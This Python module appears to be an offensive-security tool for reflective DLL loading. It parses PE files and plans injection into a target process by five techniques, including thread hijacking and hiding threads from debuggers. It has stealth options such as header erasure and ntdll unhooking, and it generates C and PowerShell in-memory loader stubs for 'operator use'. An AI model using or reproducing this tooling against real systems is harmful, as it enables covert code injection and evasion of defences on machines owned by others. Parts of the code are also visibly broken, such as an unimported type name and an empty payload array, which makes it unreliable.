"""Reflective DLL loading — load PE from memory without touching disk.

Implements manual PE parsing, import resolution, relocations, and DllMain
invocation. Supports five injection techniques: CreateRemoteThread,
NtCreateThreadEx, QueueUserAPC, SetWindowsHookEx, and thread hijacking.

All operations use raw bytes — no LoadLibrary or GetProcAddress for
the target DLL. Designed for in-process or cross-process reflection.
"""

from __future__ import annotations

import hashlib
import struct
from dataclasses import dataclass, field
from typing import Any

IMAGE_DOS_SIGNATURE = 0x5A4D
IMAGE_NT_SIGNATURE = 0x00004550
IMAGE_FILE_MACHINE_AMD64 = 0x8664
IMAGE_FILE_MACHINE_I386 = 0x014C

IMAGE_DIRECTORY_ENTRY_EXPORT = 0
IMAGE_DIRECTORY_ENTRY_IMPORT = 1
IMAGE_DIRECTORY_ENTRY_BASERELOC = 5

IMAGE_REL_BASED_ABSOLUTE = 0
IMAGE_REL_BASED_HIGHLOW = 3
IMAGE_REL_BASED_DIR64 = 10
IMAGE_REL_BASED_HIGH = 1
IMAGE_REL_BASED_LOW = 2

IMAGE_SIZEOF_SHORT_NAME = 8


@dataclass
class PEHeader:
    """Parsed portable executable header fields.

    Attributes:
        machine: Target CPU architecture.
        number_of_sections: Count of section headers.
        size_of_optional_header: Bytes of optional header.
        characteristics: DLL/EXE flags.
        entry_point_rva: Relative virtual address of entry.
        image_base: Preferred load address.
        section_alignment: Memory section alignment.
        file_alignment: Disk section alignment.
        size_of_image: Total image size in memory.
        size_of_headers: Combined header size.
        subsystem: GUI/CUI/NATIVE subsystem.
        dll_characteristics: ASLR, DEP, etc.
    """

    machine: int = 0
    number_of_sections: int = 0
    size_of_optional_header: int = 0
    characteristics: int = 0
    entry_point_rva: int = 0
    image_base: int = 0
    section_alignment: int = 0
    file_alignment: int = 0
    size_of_image: int = 0
    size_of_headers: int = 0
    subsystem: int = 0
    dll_characteristics: int = 0


@dataclass
class DataDirectory:
    """PE data directory entry.

    Attributes:
        virtual_address: RVA of the directory data.
        size: Size of the directory data in bytes.
    """

    virtual_address: int = 0
    size: int = 0


@dataclass
class SectionHeader:
    """Parsed PE section header.

    Attributes:
        name: Section name (max 8 chars).
        virtual_address: RVA of section in memory.
        virtual_size: Size of section in memory.
        raw_data_offset: File offset of section data.
        raw_data_size: Size of raw section data.
        characteristics: Section flags (executable, writable, readable).
    """

    name: str = ""
    virtual_address: int = 0
    virtual_size: int = 0
    raw_data_offset: int = 0
    raw_data_size: int = 0
    characteristics: int = 0


@dataclass
class ImportDescriptor:
    """Parsed import directory entry.

    Attributes:
        dll_name: Name of the imported DLL.
        function_names: List of imported function names or ordinals.
        original_first_thunk_rva: RVA of the import lookup table.
        first_thunk_rva: RVA of the import address table.
    """

    dll_name: str = ""
    function_names: list[str] = field(default_factory=list)
    original_first_thunk_rva: int = 0
    first_thunk_rva: int = 0


@dataclass
class ReflectiveLoaderConfig:
    """Configuration for reflective DLL loading.

    Attributes:
        target_process_id: PID to inject into (0 for self-injection).
        injection_technique: createremotethread, ntcreatethreadex, queueuserapc,
            setwindowshookex, threadhijack.
        injection_entry: Export name / ordinal to call after loading.
        injection_args: Argument bytes to pass to the entry point.
        erase_headers: Zero out PE headers post-load for stealth.
        unhook_ntdll: Restore clean ntdll.dll from disk before loading.
    """

    target_process_id: int = 0
    injection_technique: str = "createremotethread"
    injection_entry: str = ""
    injection_args: bytes = b""
    erase_headers: bool = False
    unhook_ntdll: bool = False


class PEParser:
    """Parse a portable executable from raw bytes for manual loading.

    Extracts DOS header, NT headers, section table, import table,
    export table, and base relocations without using LoadLibrary.
    """

    __slots__ = ("_data", "_dos_offset", "_nt_offset", "_is_64bit")

    def __init__(self, pe_data: bytes):
        if len(pe_data) < 64:
            raise ValueError("PE data too small (min 64 bytes)")
        if struct.unpack_from("<H", pe_data, 0)[0] != IMAGE_DOS_SIGNATURE:
            raise ValueError("Invalid DOS signature (not a PE file)")

        self._data = pe_data
        self._dos_offset = 0
        self._nt_offset = struct.unpack_from("<I", pe_data, 0x3C)[0]
        if self._nt_offset < 0 or self._nt_offset > len(pe_data) - 4:
            raise ValueError("PE NT header offset out of bounds")
        if struct.unpack_from("<I", pe_data, self._nt_offset)[0] != IMAGE_NT_SIGNATURE:
            raise ValueError("Invalid NT signature")
        self._is_64bit = False

    def parse_file_header(self) -> PEHeader:
        """Extract the COFF file header.

        Returns:
            PEHeader with machine, sections, and characteristics.
        """
        offset = self._nt_offset + 4
        machine = struct.unpack_from("<H", self._data, offset)[0]
        self._is_64bit = machine == IMAGE_FILE_MACHINE_AMD64
        sections = struct.unpack_from("<H", self._data, offset + 2)[0]
        opt_header_size = struct.unpack_from("<H", self._data, offset + 16)[0]
        characteristics = struct.unpack_from("<H", self._data, offset + 18)[0]

        header = PEHeader(
            machine=machine,
            number_of_sections=sections,
            size_of_optional_header=opt_header_size,
            characteristics=characteristics,
        )

        opt_offset = offset + 20
        if self._is_64bit:
            header.image_base = struct.unpack_from("<Q", self._data, opt_offset + 24)[0]
            header.section_alignment = struct.unpack_from("<I", self._data, opt_offset + 32)[0]
            header.file_alignment = struct.unpack_from("<I", self._data, opt_offset + 36)[0]
            header.size_of_image = struct.unpack_from("<I", self._data, opt_offset + 56)[0]
            header.size_of_headers = struct.unpack_from("<I", self._data, opt_offset + 60)[0]
            header.subsystem = struct.unpack_from("<H", self._data, opt_offset + 68)[0]
            header.dll_characteristics = struct.unpack_from("<H", self._data, opt_offset + 70)[0]
            header.entry_point_rva = struct.unpack_from("<I", self._data, opt_offset + 16)[0]
        else:
            header.image_base = struct.unpack_from("<I", self._data, opt_offset + 28)[0]
            header.section_alignment = struct.unpack_from("<I", self._data, opt_offset + 32)[0]
            header.file_alignment = struct.unpack_from("<I", self._data, opt_offset + 36)[0]
            header.size_of_image = struct.unpack_from("<I", self._data, opt_offset + 56)[0]
            header.size_of_headers = struct.unpack_from("<I", self._data, opt_offset + 60)[0]
            header.subsystem = struct.unpack_from("<H", self._data, opt_offset + 68)[0]
            header.dll_characteristics = struct.unpack_from("<H", self._data, opt_offset + 70)[0]
            header.entry_point_rva = struct.unpack_from("<I", self._data, opt_offset + 16)[0]

        return header

    def parse_sections(self, num_sections: int) -> list[SectionHeader]:
        """Parse all section headers from the PE.

        Args:
            num_sections: Number of sections from the file header.

        Returns:
            List of SectionHeader objects.
        """
        file_header_offset = self._nt_offset + 4
        optional_header_size = struct.unpack_from("<H", self._data, file_header_offset + 16)[0]
        section_offset = file_header_offset + 20 + optional_header_size

        sections = []
        for _ in range(num_sections):
            raw_name = self._data[section_offset : section_offset + IMAGE_SIZEOF_SHORT_NAME]
            name = raw_name.rstrip(b"\x00").decode("ascii", errors="replace")
            virtual_size = struct.unpack_from("<I", self._data, section_offset + 8)[0]
            virtual_address = struct.unpack_from("<I", self._data, section_offset + 12)[0]
            raw_data_size = struct.unpack_from("<I", self._data, section_offset + 16)[0]
            raw_data_offset = struct.unpack_from("<I", self._data, section_offset + 20)[0]
            characteristics = struct.unpack_from("<I", self._data, section_offset + 36)[0]
            sections.append(
                SectionHeader(
                    name=name,
                    virtual_address=virtual_address,
                    virtual_size=virtual_size,
                    raw_data_offset=raw_data_offset,
                    raw_data_size=raw_data_size,
                    characteristics=characteristics,
                )
            )
            section_offset += 40
        return sections

    def parse_data_directories(self, num_entries: int = 16) -> list[DataDirectory]:
        """Parse the PE data directory entries.

        Args:
            num_entries: Number of directory entries (default 16).

        Returns:
            List of DataDirectory objects.
        """
        file_header_offset = self._nt_offset + 4
        opt_header_size = struct.unpack_from("<H", self._data, file_header_offset + 16)[0]
        opt_offset = file_header_offset + 20
        data_dir_offset = opt_offset + (112 if self._is_64bit else 96)

        directories = []
        for _ in range(num_entries):
            va = struct.unpack_from("<I", self._data, data_dir_offset)[0]
            size = struct.unpack_from("<I", self._data, data_dir_offset + 4)[0]
            directories.append(DataDirectory(virtual_address=va, size=size))
            data_dir_offset += 8
        return directories

    def rva_to_offset(self, rva: int, sections: list[SectionHeader]) -> int:
        """Convert a relative virtual address to a file offset.

        Args:
            rva: Relative virtual address.
            sections: Parsed section table.

        Returns:
            File offset or -1 if the RVA doesn't map.
        """
        for section in sections:
            if section.virtual_address <= rva < section.virtual_address + section.virtual_size:
                return rva - section.virtual_address + section.raw_data_offset
        return -1

    def parse_imports(self, import_dir: DataDirectory, sections: list[SectionHeader]) -> list[ImportDescriptor]:
        """Parse the import directory to enumerate imported DLLs and functions.

        Args:
            import_dir: IMAGE_DIRECTORY_ENTRY_IMPORT data directory.
            sections: Parsed section table.

        Returns:
            List of ImportDescriptor objects.
        """
        if not import_dir.virtual_address or not import_dir.size:
            return []

        file_offset = self.rva_to_offset(import_dir.virtual_address, sections)
        if file_offset < 0:
            return []

        imports = []
        entry_size = 20
        pos = file_offset

        while True:
            if pos + entry_size > len(self._data):
                break
            original_first_thunk = struct.unpack_from("<I", self._data, pos)[0]
            first_thunk = struct.unpack_from("<I", self._data, pos + 16)[0]
            name_rva = struct.unpack_from("<I", self._data, pos + 12)[0]

            if name_rva == 0:
                break

            dll_name = self._read_asciiz_at_rva(name_rva, sections)
            func_names = self._parse_thunk_names(original_first_thunk, sections)

            imports.append(
                ImportDescriptor(
                    dll_name=dll_name,
                    function_names=func_names,
                    original_first_thunk_rva=original_first_thunk,
                    first_thunk_rva=first_thunk,
                )
            )
            pos += entry_size

        return imports

    def parse_relocations(self, reloc_dir: DataDirectory, sections: list[SectionHeader]) -> list[tuple[int, int]]:
        """Parse base relocation entries.

        Args:
            reloc_dir: IMAGE_DIRECTORY_ENTRY_BASERELOC data directory.
            sections: Parsed section table.

        Returns:
            List of (offset, type) tuples for relocation fixups.
        """
        if not reloc_dir.virtual_address or not reloc_dir.size:
            return []

        file_offset = self.rva_to_offset(reloc_dir.virtual_address, sections)
        if file_offset < 0:
            return []

        relocations = []
        pos = file_offset
        end = file_offset + reloc_dir.size

        while pos + 8 <= end:
            page_rva = struct.unpack_from("<I", self._data, pos)[0]
            block_size = struct.unpack_from("<I", self._data, pos + 4)[0]
            if block_size == 0:
                break

            num_entries = (block_size - 8) // 2
            entry_pos = pos + 8
            for _ in range(num_entries):
                if entry_pos + 2 > len(self._data):
                    break
                entry = struct.unpack_from("<H", self._data, entry_pos)[0]
                reloc_type = entry >> 12
                offset = entry & 0xFFF
                if reloc_type in (
                    IMAGE_REL_BASED_HIGHLOW,
                    IMAGE_REL_BASED_DIR64,
                    IMAGE_REL_BASED_HIGH,
                    IMAGE_REL_BASED_LOW,
                ):
                    relocations.append((page_rva + offset, reloc_type))
                entry_pos += 2

            pos += block_size

        return relocations

    def parse_exports(self, export_dir: DataDirectory, sections: list[SectionHeader]) -> dict[str, int]:
        """Parse the export directory.

        Args:
            export_dir: IMAGE_DIRECTORY_ENTRY_EXPORT data directory.
            sections: Parsed section table.

        Returns:
            Dict mapping export name to RVA.
        """
        if not export_dir.virtual_address or not export_dir.size:
            return {}

        file_offset = self.rva_to_offset(export_dir.virtual_address, sections)
        if file_offset < 0:
            return {}

        num_names = struct.unpack_from("<I", self._data, file_offset + 24)[0]
        names_rva = struct.unpack_from("<I", self._data, file_offset + 32)[0]
        ordinals_rva = struct.unpack_from("<I", self._data, file_offset + 36)[0]
        functions_rva = struct.unpack_from("<I", self._data, file_offset + 28)[0]

        exports: dict[str, int] = {}
        for i in range(num_names):
            name_rva_offset = self.rva_to_offset(names_rva + i * 4, sections)
            if name_rva_offset < 0:
                continue
            func_name_rva = struct.unpack_from("<I", self._data, name_rva_offset)[0]
            func_name = self._read_asciiz_at_rva(func_name_rva, sections)

            ordinal_offset = self.rva_to_offset(ordinals_rva + i * 2, sections)
            if ordinal_offset < 0:
                continue
            ordinal = struct.unpack_from("<H", self._data, ordinal_offset)[0]

            func_rva_offset = self.rva_to_offset(functions_rva + ordinal * 4, sections)
            if func_rva_offset < 0:
                continue
            func_rva = struct.unpack_from("<I", self._data, func_rva_offset)[0]
            exports[func_name] = func_rva

        return exports

    def _read_asciiz_at_rva(self, rva: int, sections: list[SectionHeader]) -> str:
        offset = self.rva_to_offset(rva, sections)
        if offset < 0:
            return ""
        end = self._data.find(b"\x00", offset)
        if end < 0:
            end = len(self._data)
        return self._data[offset:end].decode("ascii", errors="replace")

    def _parse_thunk_names(self, thunk_rva: int, sections: list[SectionHeader]) -> list[str]:
        names = []
        if thunk_rva == 0:
            return names

        offset = self.rva_to_offset(thunk_rva, sections)
        if offset < 0:
            return names

        ptr_size = 8 if self._is_64bit else 4
        pos = offset
        while pos + ptr_size <= len(self._data):
            if self._is_64bit:
                addr = struct.unpack_from("<Q", self._data, pos)[0]
            else:
                addr = struct.unpack_from("<I", self._data, pos)[0]

            if addr == 0:
                break
            if addr & (1 << (63 if self._is_64bit else 31)):
                ordinal = addr & 0xFFFF
                names.append(f"#{ordinal}")
            else:
                hint_name = self._read_asciiz_at_rva(addr & 0x7FFFFFFF, sections)
                names.append(hint_name)
            pos += ptr_size

        return names

    @property
    def is_64bit(self) -> bool:
        return self._is_64bit

    @property
    def raw_data(self) -> bytes:
        return self._data


class ReflectiveLoader:
    """Plan reflective DLL load strategy and generate shellcode wrappers.

    Produces Python instructions, C stubs, or PowerShell scripts that
    implement reflective loading for operator use. Does not perform the
    actual load (that requires native execution on target).

    Attributes:
        parser: PEParser instance with parsed PE data.
        file_header: Extracted PEHeader.
        sections: List of SectionHeader.
        data_dirs: List of DataDirectory (16 entries).
        imports: Parsed import descriptors.
        relocations: Parsed base relocations.
        exports: Parsed export table.
    """

    __slots__ = (
        "_parser", "_file_header", "_sections", "_data_dirs",
        "_imports", "_relocations", "_exports", "_config",
    )

    def __init__(self, pe_data: bytes, config: Optional[ReflectiveLoaderConfig] = None):
        self._parser = PEParser(pe_data)
        self._file_header = self._parser.parse_file_header()
        self._sections = self._parser.parse_sections(self._file_header.number_of_sections)
        self._data_dirs = self._parser.parse_data_directories()
        self._imports = self._parser.parse_imports(
            self._data_dirs[IMAGE_DIRECTORY_ENTRY_IMPORT], self._sections
        )
        self._relocations = self._parser.parse_relocations(
            self._data_dirs[IMAGE_DIRECTORY_ENTRY_BASERELOC], self._sections
        )
        self._exports = self._parser.parse_exports(
            self._data_dirs[IMAGE_DIRECTORY_ENTRY_EXPORT], self._sections
        )
        self._config = config or ReflectiveLoaderConfig()

    @property
    def sha256(self) -> str:
        """SHA-256 hash of the raw PE bytes."""
        return hashlib.sha256(self._parser.raw_data).hexdigest()

    @property
    def architecture(self) -> str:
        """CPU architecture string ('x64' or 'x86')."""
        return "x64" if self._parser.is_64bit else "x86"

    @property
    def required_imports(self) -> list[str]:
        """DLL names needed for import resolution."""
        seen: set[str] = set()
        result = []
        for imp in self._imports:
            dll = imp.dll_name.lower()
            if dll not in seen:
                seen.add(dll)
                result.append(imp.dll_name)
        return result

    def plan_injection(self) -> dict[str, Any]:
        """Generate an injection plan based on the configured technique.

        Returns:
            Dict with technique, process_id, entry_point, and required steps.
        """
        technique = self._config.injection_technique.lower()
        plan: dict[str, Any] = {
            "technique": technique,
            "target_pid": self._config.target_process_id,
            "entry_rva": self._file_header.entry_point_rva,
            "image_base": self._file_header.image_base,
            "size_of_image": self._file_header.size_of_image,
            "required_imports": self.required_imports,
            "relocation_count": len(self._relocations),
            "steps": [],
        }

        technique_steps: dict[str, list[str]] = {
            "createremotethread": [
                "OpenProcess(PROCESS_ALL_ACCESS, pid)",
                "VirtualAllocEx(MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, size)",
                "WriteProcessMemory(local_image, size)",
                "Apply base relocations if base differs",
                "Resolve imports via custom GetProcAddress",
                "CreateRemoteThread(entry_point, NULL)",
            ],
            "ntcreatethreadex": [
                "NtOpenProcess(PROCESS_ALL_ACCESS, pid)",
                "NtAllocateVirtualMemory(MEM_COMMIT, PAGE_EXECUTE_READWRITE, size)",
                "NtWriteVirtualMemory(local_image, size)",
                "Apply base relocations",
                "Resolve imports",
                "NtCreateThreadEx(entry_point, NULL, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER)",
            ],
            "queueuserapc": [
                "OpenProcess(PROCESS_ALL_ACCESS, pid)",
                "Enumerate threads via CreateToolhelp32Snapshot",
                "VirtualAllocEx per thread (PAGE_EXECUTE_READWRITE)",
                "WriteProcessMemory shellcode per allocation",
                "QueueUserAPC(entry_point, thread, NULL) for each thread",
                "Wait for thread to enter alertable state",
            ],
            "setwindowshookex": [
                "VirtualAlloc(MEM_COMMIT, PAGE_EXECUTE_READWRITE, size) in self",
                "Copy reflective loader DLL to allocation",
                "SetWindowsHookEx(WH_KEYBOARD, hook_proc, self_module, thread_id)",
                "Trigger keyboard event (SendInput or PostMessage)",
            ],
            "threadhijack": [
                "OpenProcess(PROCESS_ALL_ACCESS, pid)",
                "CreateToolhelp32Snapshot / Thread32First for thread list",
                "SuspendThread(target_thread)",
                "VirtualAllocEx(BP_LOCATION and SHELLCODE_LOCATION)",
                "GetThreadContext, modify RIP/EIP to shellcode",
                "SetThreadContext, ResumeThread",
            ],
        }

        plan["steps"] = technique_steps.get(technique, technique_steps["createremotethread"])
        return plan

    def generate_c_stub(self) -> str:
        """Generate a C stub that implements reflective loading.

        Returns:
            C source code string with reflective loader logic.
        """
        pe_b64 = __import__("base64").b64encode(self._parser.raw_data).decode()
        return f'''\
#include <windows.h>

typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

static unsigned char dll_data[] = {{ /* base64: {pe_b64} */ }};

__declspec(dllexport) void ReflectiveLoader(LPVOID lpLoaderParameter) {{
    (void)lpLoaderParameter;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_data;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((LPBYTE)dll_data + dos->e_lfanew);
    DWORD image_size = nt->OptionalHeader.SizeOfImage;
    LPBYTE base = (LPBYTE)VirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return;

    memcpy(base, dll_data, nt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {{
        memcpy(base + sec[i].VirtualAddress, dll_data + sec[i].PointerToRawData, sec[i].SizeOfRawData);
    }}

    DWORD_PTR delta = (DWORD_PTR)base - nt->OptionalHeader.ImageBase;
    if (delta) {{
        PIMAGE_DATA_DIRECTORY reloc = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc->Size) {{
            LPBYTE reloc_base = base + reloc->VirtualAddress;
            DWORD size = 0;
            while (size < reloc->Size) {{
                PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)(reloc_base + size);
                size += block->SizeOfBlock;
                DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                LPWORD entries = (LPWORD)(block + 1);
                for (DWORD i = 0; i < count; i++) {{
                    if (entries[i] >> 12 == IMAGE_REL_BASED_DIR64) {{
                        *(DWORD_PTR*)(base + block->VirtualAddress + (entries[i] & 0xFFF)) += delta;
                    }}
                }}
            }}
        }}
    }}

    PIMAGE_DATA_DIRECTORY import_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir->Size) {{
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(base + import_dir->VirtualAddress);
        while (imp->Name) {{
            HMODULE hMod = LoadLibraryA((LPCSTR)(base + imp->Name));
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(base + imp->FirstThunk);
            while (thunk->u1.AddressOfData) {{
                if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {{
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(hMod, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
                }} else {{
                    PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(base + thunk->u1.AddressOfData);
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(hMod, name->Name);
                }}
                thunk++;
            }}
            imp++;
        }}
    }}

    DWORD old;
    VirtualProtect(base, image_size, PAGE_EXECUTE_READ, &old);
    BOOL (WINAPI *DllEntry)(HINSTANCE, DWORD, LPVOID) =
        (BOOL (WINAPI *)(HINSTANCE, DWORD, LPVOID))(base + nt->OptionalHeader.AddressOfEntryPoint);
    DllEntry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
}}
'''

    def generate_powershell_stub(self) -> str:
        """Generate PowerShell reflective loader script.

        Returns:
            PowerShell script for .NET Assembly.Load reflectively.
        """
        pe_b64 = __import__("base64").b64encode(self._parser.raw_data).decode()
        return f'''\
function Invoke-ReflectivePEInjection {{
    param([byte[]]$PEBytes)
    $asm = [System.Reflection.Assembly]::Load($PEBytes)
    $entry = $asm.EntryPoint
    if ($entry) {{ $entry.Invoke($null, @(,@())) }}
}}
$b64 = "{pe_b64}"
$bytes = [System.Convert]::FromBase64String($b64)
Invoke-ReflectivePEInjection -PEBytes $bytes
'''

    def summarize(self) -> dict[str, Any]:
        """Human-readable summary of the parsed PE for operator review.

        Returns:
            Dict with architecture, imports, sections, exports, and hashes.
        """
        return {
            "architecture": self.architecture,
            "sha256": self.sha256,
            "entry_point_rva": hex(self._file_header.entry_point_rva),
            "image_base": hex(self._file_header.image_base),
            "size_of_image": self._file_header.size_of_image,
            "sections": [
                {
                    "name": s.name,
                    "virtual_address": hex(s.virtual_address),
                    "virtual_size": s.virtual_size,
                    "characteristics": hex(s.characteristics),
                }
                for s in self._sections
            ],
            "imports": [
                {"dll": imp.dll_name, "functions": imp.function_names[:20]}
                for imp in self._imports
            ],
            "exports": list(self._exports.keys())[:50],
            "relocation_count": len(self._relocations),
        }
